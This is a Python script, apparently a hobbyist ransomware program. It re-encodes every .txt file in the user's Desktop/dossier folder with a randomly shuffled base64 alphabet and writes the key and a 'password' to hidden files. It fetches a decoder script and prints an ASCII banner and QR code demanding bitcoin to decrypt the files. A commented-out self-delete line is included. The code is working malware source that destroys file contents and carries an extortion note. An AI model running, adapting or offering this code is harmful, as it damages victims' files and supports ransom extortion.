import os
import random
import time
import urllib.request

base64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
rand = random.sample(range(1, 64), 63)
decode = [random.randrange(63) for i in range(0, 63)]
base64 = [base64[rand[element]] for element in range(0, (len(rand) - 1))]
base64_crypted = "".join(base64)

TGREEN = '\033[32m'  # Green Text
TRED = '\033[31m'  # Red Text
TYELLOW = '\033[33m'  # Yellow Text
ENDC = '\033[m'  # reset to the defaults


def encode(mot):
    mot = mot.encode()
    car_list = []
    car_block = []
    base64string = ''
    for lettre in mot:
        a = bin(lettre)
        car_list.append(a[2:])
    position = 0
    for element in car_list:
        car_list[position] = element.zfill(8)
        position += 1
    car_string = ''.join(car_list)
    for i in range(0, len(car_string), 6):
        car_block.append(car_string[i:i + 6])
    if len(car_block[len(car_block) - 1]) < 6:
        car_block[len(car_block) - 1] += '0' * (6 - len(car_block[len(car_block) - 1]))
    for objet in car_block:
        g = int(objet, base=2)
        base64string += base64_crypted[g]
    if len(base64string) % 4 != 0:
        base64string += '=' * (4 - (len(base64string) % 4))
    return base64string


# crypt files txt
for element in os.listdir("/Users/" + os.getlogin() + "/Desktop/dossier/"):
    if element.endswith('.txt'):
        file = open("/Users/" + os.getlogin() + "/Desktop/dossier/" + element, 'r')
        newtext = encode(str(file.read()))
        file = open("/Users/" + os.getlogin() + "/Desktop/dossier/" + element, 'w')
        file.write(newtext)
        file.close()
    else:
        pass


# Create password
password = base64_crypted
# Create decodeur.py
# TODO -> download the file decodeur.py on google
url_decodeur = 'file:///Users/leducmaxime/PycharmProjects/untitled/decodeur.py'
urllib.request.urlretrieve(url_decodeur,  "/Users/" + os.getlogin() + "/Desktop/dossier/decodeur.py")
# Create the hide file with the password for decrypt
file_pass = open("/Users/" + os.getlogin() + "/Desktop/dossier/.pass", "w+")
file_pass.write(os.getlogin())
file_pass.close()
# Create the hide file with the key generate of base64
file_key = open("/Users/" + os.getlogin() + "/Desktop/dossier/.key", "w+")
file_key.write(base64_crypted)
file_key.close()
# Create readme.txt
file_readme = open("/Users/" + os.getlogin() + "/Desktop/dossier/readme.txt", "w+")
file_readme.write('Open your Terminal and copy paste : python3 /Users/' + os.getlogin() + '/Desktop/dossier/decodeur.py -h')
file_readme.close()
# print the H4CK3R information
print(
    TGREEN + 80 * "=" + "\n           __    __       ___       ______  __  ___  _______  _______  \n          |  |  |  |     /   \     /      ||  |/  / |   ____||       \ \n          |  |__|  |    /  ^  \   |  ,---- |  `  /  |  |__   |  .--.  |\n          |   __   |   /  /_\  \  |  |     |    <   |   __|  |  |  |  |\n          |  |  |  |  /  _____  \ |  `----.|  .  \  |  |____ |  `--`  |\n          |__|  |__| /__/     \__\ \______||__|\__\ |_______||_______/ \n\n" + 80 * "=" + "\n\n • You just got hacked by the H4CK3R™ \n\n • All your files are been encrypted\n\n • For decrypt your files you must send \n   100$ in btc to the address below\n" + ENDC + 80 * "=")
time.sleep(3)
print(
    "\n   ▄▄▄▄▄▄▄ ▄ ▄ ▄▄▄▄   ▄▄ ▄▄▄▄▄▄▄\n   █ ▄▄▄ █ ▄██▀▀▀  █ █▄▀ █ ▄▄▄ █\n   █ ███ █ █▀▀▄█ █▀▄██ ▀ █ ███ █\n   █▄▄▄▄▄█ ▄ █▀▄▀▄▀█ █▀▄ █▄▄▄▄▄█              " + TGREEN + "Please send 0.001 BTC" + ENDC + "\n   ▄▄▄▄  ▄ ▄ █▄█▄ ███▄ ▀▄  ▄▄▄ ▄              " + TGREEN + "To this BTC adress by" + ENDC + "\n    ▀▀▄██▄▀ ▄█▄██▀▀▄▄▄ ▀█▀▀▀▄▄█▀\n   █▀ ▄█▄▄█▄██ ▄ ▄ █▄ ▄▀▄ ▀▄█▄▀▀\n   █▄▄ █▄▄█ ▄▄█▀▄▀▀█▄▄█▄██  ▄ ▄█\n   ▀ ▀▀█ ▄█▀██▀▄ █▀▄▄█ ▀█▀█ █▄█▀              " + TGREEN + "If you don't know how" + ENDC + "\n   ▄▀▀█ ▄▄█ ██  ▄█▄ ▄▄ █ ▀▀   █               " + TGREEN + "to get bitcoin? Go to" + ENDC + "\n    ▄▀▀██▄▄█ █▀ ██▀▀██▀█▄▄████▀█              " + TGREEN + "coinbase.com and signup" + ENDC + "\n   ▄▄▄▄▄▄▄ ▀▄▄   ▄ ██ ▄█ ▄ █ █ ▀\n   █ ▄▄▄ █  ▄▄█▀▀▀▄ ▄█ █▄▄▄█ ▄▄ \n   █ ███ █ █▀█▀▄▀▄▀▀ ▀▄ ▀▄█ ▀▀ █\n   █▄▄▄▄▄█ █▀█▄▀▀  █  ▄█ █▄▄▀▄█\n                      \n\n" + 80 * "=")
#os.remove(os.path.realpath(__file__)) #Auto delete